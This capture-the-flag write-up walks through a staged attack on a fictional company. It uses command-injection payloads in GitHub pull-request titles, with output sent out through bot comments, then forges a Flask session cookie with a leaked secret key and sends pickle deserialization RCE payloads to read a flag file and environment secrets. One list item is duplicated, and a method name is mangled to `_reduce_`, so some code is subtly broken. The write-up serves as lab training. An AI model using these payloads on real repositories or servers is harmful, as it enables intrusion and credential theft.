# Defhawk Sponsored Challenge 1

| Field      | Value |
|------------|-------|
| Category   | Sponsors |
| Points     | 500 |
| Solves     | 1 |

## Description

New leadership rarely starts from zero.

Karyl Maxson has recently taken charge of a company operating in the infrastructure and automation space.
From the outside, the transition looks seamless — systems remain online, workflows continue uninterrupted, and business moves forward as usual.

But transitions always leave traces.

People don’t vanish.
Tools don’t get rebuilt overnight.
Processes don’t reset.

They’re inherited.

Your task is to understand how Karyl’s company operates, what changed after his arrival, and what remained from before.

Start with Karyl.
Follow what connects to him.
Everything else will reveal itself.


**> Flag Format: DEFHAWK{}**

## Writeup

### Flag

```
DEFHAWK{4_w3ll_ex3cut3d_supply_ch41n_4ttack_W3ll_done!!}
```

### Introduction

The first thing I did after reading this challenge was paste the guy's name "Karyl Maxson" into my already open Twitter tab, and voila, we had a match for: https://x.com/karylmaxson

Upon going through the literal slop that those tweets are (no offense, chall author, maybe that was intended?), I deduced that Karyl is the Founder & CEO of Karyx-Tech. Since this is obviously a tech org, the first thing I did was navigate to github.com/Karyx-Tech, and we had another hit there.

The Karyx-Tech GitHub org has 1 public repository listed: https://github.com/Karyx-Tech/dev-iot-util. Some repo stats here:

- Commits: 14
- Contributors: 4, one of whom is the karyxbot account

Here's when my alarm bells started to ring off, I saw a `.github/workflows` directory and a bot user that was a contributor, so the bot was being probably driven by this workflow and it had some permissions attached to itself too.

That's when I got reminded of the numerous supply chain attacks that have been happening lately, starting with Shai-Hulud and then the Shai-Hulud 2.0 where numerous popular packages were compromised via GitHub Actions. (https://unit42.paloaltonetworks.com/npm-supply-chain-attack/)

### Attack vectors

I did look through the codebase as well, saw a binary called sensor (https://github.com/Karyx-Tech/dev-iot-util/blob/main/firmware/sensor), downloaded it and tried to see if there's anything challenge related I could get out of this. But nope.

I finally looked at the elephant in the room, the workflow, the vulnerability became pretty obvious from there:

The workflow was set up to run on pull_request_target, which is already dangerous if you are handling untrusted PR data. It was also running on a self-hosted runner and exporting a real secret token into the job:

```
  on:
    pull_request_target:
      types: [opened, synchronize, reopened]

  permissions:
    contents: write

  env:
    GH_TOKEN: ${{ secrets.BOT_GH_TOKEN }}
```

That alone was already bad, but the real issue was how the PR title was being used. The workflow passed the PR title into a Python script, and that script eventually built a shell command with shell=True.

And I don't know why the script was trying to call `./scripts/internal_sync.sh` because that file did not even exist in the repo.

### Can we do command injection?

Now let's get to the juicy bit, I really enjoyed this challenge...upon opening the pull requests tab, I couldn't help but notice 6 closed PRs, and there they were:

![Closed Pull Requests](image.png)

Upon looking at this, my findings were only becoming as clear as day. I forked the repo, made a harmless one-file commit, and opened a single PR back to the target repo. That became PR 7.

I noticed the workflow also triggered on reopened, so I reused the same PR over and over by closing it, editing the title, and reopening it. That was cleaner than creating new PRs for every payload.

The first thing I wanted was a basic proof of execution. I used the PR title itself as the payload:

  ```' && gh api repos/Karyx-Tech/dev-iot-util/issues/7/comments -f body="$(whoami)" #```

This was pretty simple, we break out of the quoted PR title content, run a command of our choice, use the gh api to comment the output back to the repo and then comment out the rest of the original line.

A few seconds later, the bot commented:

runner

That was the confirmation I needed. I had command execution on the GitHub Actions runner, and I had a working exfiltration channel through PR comments.

### What can the bot token see?

Now that I knew I could run commands on the runner and that GH_TOKEN was present, the next question was simple: what can that token access?

So I used another PR-title payload to list repos in the org:

 ``` ' && gh api repos/Karyx-Tech/dev-iot-util/issues/7/comments -f body="$(gh repo list Karyx-Tech --limit 100 --json name,isPrivate,visibility,url)" #```

The bot commented back JSON showing two repos:

  - public: dev-iot-util
  - private: iot-panel-prod

The public repo description had already hinted that “the prod application will be in private repo,” so once I saw iot-panel-prod, I knew that was almost certainly the next stage of the challenge.

From there I listed the contents of the private repo and got back files like:

  - server.py
  - requirements.txt
  - templates/...
  - static/...

The contents API response also leaked signed download_url links for specific files, which let me pull server.py directly for offline analysis (mostly because I just wanted to grep for the flag, but this was not going to be that easy)

### The private repo

server.py was basically the roadmap for the rest of the challenge.

A few things jumped out immediately:

  1. The app was Flask-based.
  2. It bound to port 5007.
  3. It had a hardcoded fallback secret:

     ```flask_app.secret_key = os.environ.get('SECRET_KEY', 'karyx-iot-super-secret-key-2024')```

  4. It also had dummy credentials

        VALID_USERNAME = "admin"
        VALID_PASSWORD = "admin"

  5. The /api/firmware route was intentionally vulnerable to pickle deserialization:

        ```data = pickle.loads(decoded)```

  6. The /api/firmware route was intentionally vulnerable to pickle deserialization:

        ```output_log.append(f"[INFO] Result: {data}")```

### The production live app

My first thought was that maybe the app was running on the same self-hosted runner. I tested 127.0.0.1:5007 from the runner by injecting a curl through the PR title. That came back empty. I also checked listening ports with ss -ltn and got no5007. I also checked the runner environment for a direct FLAG or DEFHAWK variable and got nothing. So the flag was not just sitting in the CI environment either. So that means I had to look through the private repo deeper. I found commit messages, and one of them was the entire cake:

     I think port 5007 would be the best event with any hostname,
     karyxiot.in:5007 sounds amazing!

And it matched the code that was on the private repo so I knew this was real.

### Bypassing auth on the prod app

I tried the dummy credentials I found earlier, but that obviously did not work, so then I used the other thing that was leaked, the fallback `SECRET_KEY`, and since Flask session cookies are signed client side, I can now forge my own authentication session.

I used itsdangerous and generated a session cookie with fields like:


  ```{
      "logged_in": True,
      "username": "admin",
      "login_time": "2026-03-29T13:50:00+00:00"
  }
  ```
  Using the Flask cookie serializer settings:
  ```
  URLSafeTimedSerializer(
      secret_key="karyx-iot-super-secret-key-2024",
      salt="cookie-session",
      serializer=json,
      signer_kwargs={
          "key_derivation": "hmac",
          "digest_method": hashlib.sha1,
      },
  )
  ```
  When I set that forged session cookie and requested /api/dashboard and /api/firmware, both pages loaded successfully. That confirmed the secret key in source was valid in production.

  So at that point I had authenticated access to the vulnerable firmware upload endpoint without ever needing the password.

### Exploiting the firmware endpoint

The /api/firmware route had the exact bug I wanted. It accepted a Base64 string from the firmware_data form field, decoded it, and passed it directly into pickle.loads().

Payload:

```
  class RCE:
      def _reduce_(self):
          cmd = 'echo START; find / -maxdepth 4 -iname "flag" 2>/dev/null; env | grep -E "DEFHAWK|FLAG|flag" || true; echo END'
          return (subprocess.getoutput, (cmd,))
```

I pickled that object, Base64-encoded it, and posted it to /api/firmware using the forged session cookie.

The response came back with exactly what I needed between my markers. Most of the paths were false positives from the system, but one line stood out immediately:

  /var/flag.txt

That was the actual flag path.

So I sent one more payload:

  ```
  class RCE:
      def _reduce_(self):
          cmd = 'echo START; cat /var/flag.txt; echo END'
          return (subprocess.getoutput, (cmd,))
  ```

And that returned the flag directly.

`DEFHAWK{4_w3ll_ex3cut3d_supply_ch41n_4ttack_W3ll_done!!}`
